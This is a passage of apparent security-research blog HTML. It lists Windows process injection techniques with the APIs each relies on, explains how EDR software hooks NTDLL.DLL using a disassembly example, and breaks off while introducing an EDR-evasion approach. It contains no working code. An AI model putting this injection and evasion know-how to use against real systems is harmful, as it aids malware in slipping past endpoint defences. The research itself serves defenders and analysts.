style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-hskcwvknl"><span class="akGp8"><span>Technique used to inject a malicious DLL into the memory space of another process. In this case, the malicious sample must first identify the specific process it intends to target, allocate a portion of memory within it and create a thread to start the execution of the malicious DLL from disk.</span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="o81mx2552745" data-visual-col="2" data-visual-row="2" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:-0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;right:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div><ul class="iSjXG nsGWt"><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-0ckdecpq9"><span class="akGp8"><span>VirtualAllocEx</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-63q61"><span class="akGp8"><span>WriteProcessMemory</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-7vc20"><span class="akGp8"><span>LoadLibrary</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-5njhr"><span class="akGp8"><span>CreateRemoteThread, NtCreateThreadEx or RtlCreateUserThread</span></span></p></li></ul><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div></div></td></tr><tr style="height:47px"><td data-hook="table-plugin-cell" data-node-id="a3pxq2552756" data-visual-col="0" data-visual-row="3" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-fndx00tj3"><span class="akGp8"><span>PE Injection</span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="b58eh2552758" data-visual-col="1" data-visual-row="3" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-1k3uwd5ws"><span class="akGp8"><span>Technique that maps an entire Portable Executable (PE) file into the memory space of a running process. It allocates a new memory section within the target process, which will serve as the destination for the payload. The contents of the payload are then dynamically mapped onto this memory section using its relocation descriptors and the absolute address of the section, imitating the functionality of the Windows' Loader.</span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="da3242552760" data-visual-col="2" data-visual-row="3" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:-0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;right:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div><ul class="iSjXG nsGWt"><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-w2weg7xcv"><span class="akGp8"><span>​VirtualAllocEx</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-cvs8g"><span class="akGp8"><span>WriteProcessMemory</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-desq7"><span class="akGp8"><span>CreateRemoteThread</span></span></p></li></ul><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div></div></td></tr><tr style="height:47px"><td data-hook="table-plugin-cell" data-node-id="0xtzf2552769" data-visual-col="0" data-visual-row="4" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-ten4z78p3"><span class="akGp8"><span>Process Hollowing / Run PE</span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="aviqo2552771" data-visual-col="1" data-visual-row="4" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-5402w64tl"><span class="akGp8"><span>In this technique, the original code and resources of the target process are replaced or removed, leaving behind only the bare process framework. The hollowed process then becomes a host for the injected malicious code, allowing it to execute under the guise of a legitimate process.</span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="n2lwp2552773" data-visual-col="2" data-visual-row="4" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:-0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;right:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div><ul class="iSjXG nsGWt"><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-lnwhhq60l"><span class="akGp8"><span>​CreateProcess</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-fdcab"><span class="akGp8"><span>NtUnmapViewOfSection</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-30tgj"><span class="akGp8"><span>VirtualAllocEx</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-87u0k"><span class="akGp8"><span>WriteProcessMemory</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-6aakd"><span class="akGp8"><span>SetThreadContext</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-b6jki"><span class="akGp8"><span>ResumeThread </span></span></p></li></ul><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div></div></td></tr><tr style="height:47px"><td data-hook="table-plugin-cell" data-node-id="gf8s22552788" data-visual-col="0" data-visual-row="5" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-sl838tmp1"><span class="akGp8"><span>Thread Execution Hijacking</span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="lyqup2552790" data-visual-col="1" data-visual-row="5" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-il3denlfi"><span class="akGp8"><span>​Technique used to gain control of the execution flow within a process by redirecting the execution of a target thread to arbitrary code. It allows an attacker to manipulate the behavior of a running process without creating a new process or modifying the underlying code.</span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="mpanw2552792" data-visual-col="2" data-visual-row="5" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:-0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;right:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div><ul class="iSjXG nsGWt"><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-vggso6ibx"><span class="akGp8"><span>OpenThread</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-a7rkg"><span class="akGp8"><span>SuspendThread</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-5u2qo"><span class="akGp8"><span>VirtualAllocEx</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-fl1ge"><span class="akGp8"><span>WriteProcessMemory</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-2a0ef"><span class="akGp8"><span>SetThreadContext</span></span></p></li></ul><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div></div></td></tr><tr style="height:47px"><td data-hook="table-plugin-cell" data-node-id="vgbe82552805" data-visual-col="0" data-visual-row="6" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-nj5bl702e"><span class="akGp8"><a target="_blank" href="https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection" rel="noopener" class="GKQb5 _9HA3o" data-hook="web-link"><u style="text-decoration:underline"><span>Mapping Injection</span></u></a><span> </span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="c50ee2552807" data-visual-col="1" data-visual-row="6" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-tnil5pswq"><span class="akGp8"><span>By utilizing </span><em style="font-style:italic"><span>NtMapViewOfSection</span></em><span>, the malicious code is mapped into the target process from an existing section, controlled by the attacker. This approach eliminates the requirement to explicitly allocate RWX sections and avoids the need for separate payload content copying. The malicious code indirectly becomes part of the target process's memory space, allowing it to execute within the context of a genuine module.</span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="dhqww2552809" data-visual-col="2" data-visual-row="6" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:-0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;right:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div><ul class="iSjXG nsGWt"><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-asn9jfvh3"><span class="akGp8"><span>OpenProcess, CreateProcess</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-24fo8"><span class="akGp8"><span>NtCreateSection</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-9j0v5"><span class="akGp8"><span>NtMapViewOfSection</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-9ejts"><span class="akGp8"><span>RtlCreateUserThread</span></span></p></li></ul><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div></div></td></tr><tr style="height:47px"><td data-hook="table-plugin-cell" data-node-id="r1ryq2552820" data-visual-col="0" data-visual-row="7" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-sxan1n60a"><span class="akGp8"><span>APC Injection and Atombombing</span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="0cz8h2552822" data-visual-col="1" data-visual-row="7" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-yfpcvpxwp"><span class="akGp8"><span>This technique manipulates the Asynchronous Procedure Call  (APC) mechanism in the Windows operating system to inject and execute malicious code in a target process. </span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="kzs9v2552824" data-visual-col="2" data-visual-row="7" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:-0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;right:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div><ul class="iSjXG nsGWt"><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-cv70qpnjx"><span class="akGp8"><span>OpenThread</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-98mv0"><span class="akGp8"><span>QueueUserAPC</span></span></p></li></ul><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div></div></td></tr><tr style="height:47px"><td data-hook="table-plugin-cell" data-node-id="w4lu12552831" data-visual-col="0" data-visual-row="8" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;bottom:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-tq08y2lgg"><span class="akGp8"><span>Process Doppelganging</span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="mcmgx2552833" data-visual-col="1" data-visual-row="8" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;bottom:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-7g4tdsvof"><span class="akGp8"><span>​Technique used in malware development to disguise malicious processes by creating a process with a legitimate appearance. It involves utilizing transactional NTFS (TxF) and Windows process loading mechanisms to create a new process that looks like an existing, legitimate process, but runs malicious code instead.</span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="z3fkv2552835" data-visual-col="2" data-visual-row="8" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:-0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;bottom:-0.5px;left:-0.5px;right:-0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;right:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div><ul class="iSjXG nsGWt"><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-aj2kmuv3c"><span class="akGp8"><span>​CreateTransaction</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-70ia7"><span class="akGp8"><span>CreateFileTransacted</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-5lgpt"><span class="akGp8"><span>RollbackTransaction)</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-e3jpe"><span class="akGp8"><span>NtCreateProcessEx</span></span></p></li></ul><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div></div></td></tr></tbody></table></div></div></div></div></div><div type="table" data-hook="rcv-block29"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-f7s8n"><span class="akGp8"><span>As described previously, each of these injection techniques requires a set of specific Windows APIs, which generate characteristic patterns that can be leveraged by defenders and security software for detection and mitigation purposes. </span></span></p></div><div type="paragraph" data-hook="rcv-block30"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-bi5fd"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block31"></div><div data-breakout="normal"><h2 class="AQ4-j AYDy0 nsGWt _6qLM3" dir="auto" id="viewer-67d0m"><span class="qKwSW"><span>Windows APIs Monitoring</span></span></h2></div><div type="heading" data-hook="rcv-block32"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-11duj"><span class="akGp8"><span>To enable effective analysis, detection, and mitigation of suspicious behaviors, Endpoint Detection and Response (EDR) software often utilizes specific hooks on select Windows APIs within the memory space of every process launched on a device. The exact Windows APIs monitored may vary depending on the EDR vendor, but they typically include the most commonly used functions associated with malicious techniques. By implementing these hooks, EDRs can intercept and capture the parameters passed to these functions. This capability allows the EDR to run the required checks during the normal execution of any program and identify potential malicious actions associated to the usage of these Windows APIs and respond accordingly.</span></span></p></div><div type="paragraph" data-hook="rcv-block33"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-11fv1"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block34"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-7p12m"><span class="akGp8"><span>When an application is launched, the EDR receives a notification about the new process creation and attaches its own dynamic library. Once executed, the EDR modifies specific functions within the in-memory copy of </span><strong style="font-weight:700"><span>NTDLL.DLL</span></strong><span> by altering the byte code. EDRs prioritize hooking </span><strong style="font-weight:700"><span>NTDLL.DLL</span></strong><span> due to its role as the intermediary layer between user applications and the Windows kernel, as depicted in the accompanying image.</span></span></p></div><div type="paragraph" data-hook="rcv-block35"></div><div data-breakout="normal"><div class="CKjkL" id="viewer-4fjj4"><div class="QwCqz wd7R1"><figure class="_0TCNT" data-hook="figure-IMAGE"><div data-hook="image-viewer" class="LZwXu"><div style="--dim-height:736;--dim-width:651;--ricos-image-default-border-color:unset" id="4fjj4" class="s6q7U EjY43 N8UDE" data-hook="image-viewer-4fjj4"><wow-image id="d03b6f_ab1b76ede6df4928a671e984f1bf11b2~mv2.png" class="undefined lhz4O" data-image-info="{&quot;containerId&quot;:&quot;4fjj4&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:651,&quot;height&quot;:736,&quot;uri&quot;:&quot;d03b6f_ab1b76ede6df4928a671e984f1bf11b2~mv2.png&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG 4fjj4" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/d03b6f_ab1b76ede6df4928a671e984f1bf11b2~mv2.png/v1/fill/w_65,h_74,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/d03b6f_ab1b76ede6df4928a671e984f1bf11b2~mv2.png" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution" data-pin-media="https://static.wixstatic.com/media/d03b6f_ab1b76ede6df4928a671e984f1bf11b2~mv2.png/v1/fill/w_651,h_736,al_c,q_90/d03b6f_ab1b76ede6df4928a671e984f1bf11b2~mv2.png" draggable="false"></wow-image></div><button class="TmdpQ" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="FuKsb"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></figure></div></div></div><div type="image" data-hook="rcv-block36"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-ejpml"><span class="akGp8"><span>As an example, in the code below, we can observe this kind of modifications by comparing the in-memory copy of the </span><em style="font-style:italic"><span>NtProtectVirtualMemory</span></em><span> function in the </span><strong style="font-weight:700"><span>NTDLL.DLL</span></strong><span> executed by a process running in a system with a commercial EDR solution installed and the copy of such function on-disk. In this case, the EDR replaced the original instruction </span><em style="font-style:italic"><span>mov eax, 0x50</span></em><strong style="font-weight:700"><span> </span></strong><span>(</span><strong style="font-weight:700"><span>in red</span></strong><span>) with a </span><em style="font-style:italic"><span>jmp</span></em><span> instruction (</span><strong style="font-weight:700"><span style="color:#405c9c;text-decoration:inherit"><span>in blue</span></span></strong><span>). This </span><em style="font-style:italic"><span>jmp </span></em><span>instruction performs an unconditional jump to a memory location where inspections for </span><em style="font-style:italic"><span>NtProtectVirtualMemory</span></em><span> are performed by the EDR. If any malicious activity is detected during the inspection, the EDR promptly halts the process execution.</span></span></p></div><div type="paragraph" data-hook="rcv-block37"></div><div data-breakout="normal"><pre class="v6Aoa sleG5 nsGWt" dir="auto" id="viewer-e0r8k"><span class=""><span>Original Function On-Disk:              EDR Hooked Function In-Memory:
----------------------                  -----------------------

mov     r10, rcx                        mov     r10, rcx
</span><strong style="font-weight:700"><span>mov     eax, 50h                        </span></strong><strong style="font-weight:700"><span style="color:#405c9c;text-decoration:inherit"><span>jmp     0x7ffaeadea621</span></span></strong><span>
test    byte ptr [0x7FFE0h], 1          test    byte ptr [0x7FFE0h], 1
jne     0x17e76540ea5                   jne     0x17e76540ea5
syscall                                 syscall
ret                                     ret
</span></span></pre></div><div type="code_block" data-hook="rcv-block38"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" style="padding-top:0px;padding-bottom:0px;line-height:max(0.8em, 1.714em)" dir="auto" id="viewer-1id9b"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block39"></div><div data-breakout="normal"><h2 class="AQ4-j AYDy0 nsGWt _6qLM3" dir="auto" id="viewer-fao64"><span class="qKwSW"><strong style="font-weight:700"><span>Meet the Mockingjay!</span></strong></span></h2></div><div type="heading" data-hook="rcv-block40"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-fodov"><span class="akGp8"><span>Acknowledging the fact that EDR systems often monitor system calls commonly used for code injection into a process's memory, </span><em style="font-style:italic"><span>our objective was to find a way to minimize reliance on these API calls or reduce their usage as much as possible</span></em><span>. This approach aimed to mitigate the risk of detection by defensive software, as our application would execute its injection logic without invoking those 